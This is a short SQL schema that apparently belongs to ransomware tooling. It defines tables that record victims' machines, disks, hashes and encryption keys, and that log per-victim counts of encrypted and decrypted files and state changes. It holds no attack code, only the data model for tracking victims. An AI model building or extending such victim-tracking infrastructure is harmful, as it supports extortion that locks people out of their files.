drop table if exists decrypted;
drop table if exists encrypted;
drop table if exists states;
drop table if exists victims;

create table victims
(
    id_victim integer not null
        constraint victims_pk
            primary key autoincrement,
    os         varchar,
    hash       varchar not null,
    disks      varchar,
    key        varchar not null
);

create table decrypted
(
    id_decrypted integer   not null
        constraint decrypted_pk
            primary key autoincrement,
    id_victim   integer   not null
        constraint decrypted_victims_id_victim_fk
            references victims
            on update cascade on delete cascade,
    datetime     timestamp,
    nb_files     integer   not null
);

create table encrypted
(
    id_encrypted integer   not null
        constraint encrypted_pk
            primary key autoincrement,
    id_victim   integer   not null
        constraint encrypted_victims_id_victim_fk
            references victims
            on update cascade on delete cascade,
    datetime     timestamp,
    nb_files     integer   not null
);

create table states
(
    id_state   integer   not null
        constraint states_pk
            primary key autoincrement,
    id_victim integer   not null
        constraint states_victims_id_victim_fk
            references victims
            on update cascade on delete cascade,
    datetime   timestamp ,
    state      varchar   not null
);